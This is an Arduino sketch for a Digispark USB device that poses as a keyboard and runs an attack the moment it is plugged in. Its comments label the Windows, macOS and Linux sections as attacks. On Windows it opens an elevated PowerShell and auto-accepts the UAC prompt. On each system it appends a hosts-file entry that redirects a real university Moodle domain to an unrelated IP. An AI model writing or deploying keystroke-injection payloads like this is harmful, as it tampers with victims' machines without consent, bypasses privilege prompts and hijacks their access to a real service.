#include "DigiKeyboard.h"

// === 配置 ===
// Reddit IP (2024年)
#define TARGET_IP "151.101.1.140"
#define TARGET_DOMAIN "moodle.ncnu.edu.tw"

void setup() {
  DigiKeyboard.delay(2000);
}

void loop() {
  // === 切換到英文輸入法 ===
  DigiKeyboard.sendKeyStroke(0); // 空按鍵，觸發鍵盤
  DigiKeyboard.delay(500);

  // === Windows 攻擊 ===
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(800);
  DigiKeyboard.println("powershell Start-Process powershell -Verb runAs");
  DigiKeyboard.delay(2500);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT); // UAC 確認
  DigiKeyboard.delay(1500);

  // 添加到 Windows hosts
  DigiKeyboard.print("Add-Content -Path C:\\Windows\\System32\\drivers\\etc\\hosts -Value '");
  DigiKeyboard.print(TARGET_IP);
  DigiKeyboard.print(" ");
  DigiKeyboard.print(TARGET_DOMAIN);
  DigiKeyboard.println("'");
  DigiKeyboard.delay(500);
  DigiKeyboard.println("exit");
  DigiKeyboard.delay(2000);

  // === macOS 攻擊 ===
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
  DigiKeyboard.delay(800);
  DigiKeyboard.println("Terminal");
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2500);

  // 添加到 macOS hosts (需要 sudo)
  DigiKeyboard.print("echo '");
  DigiKeyboard.print(TARGET_IP);
  DigiKeyboard.print(" ");
  DigiKeyboard.print(TARGET_DOMAIN);
  DigiKeyboard.println("' | sudo tee -a /etc/hosts");
  DigiKeyboard.delay(1000);
  // 注意: macOS 需要手動輸入密碼

  // === Linux 攻擊 (X11/Wayland) ===
  DigiKeyboard.delay(2000);
  // Alt+F2 或 Ctrl+Alt+T 開啟終端機
  DigiKeyboard.sendKeyStroke(KEY_T, MOD_CONTROL_LEFT | MOD_ALT_LEFT);
  DigiKeyboard.delay(2000);

  // 使用 pkexec (不需密碼提示) 或 sudo
  DigiKeyboard.print("echo '");
  DigiKeyboard.print(TARGET_IP);
  DigiKeyboard.print(" ");
  DigiKeyboard.print(TARGET_DOMAIN);
  DigiKeyboard.println("' | sudo tee -a /etc/hosts");
  DigiKeyboard.delay(1000);

  for(;;) {}
}
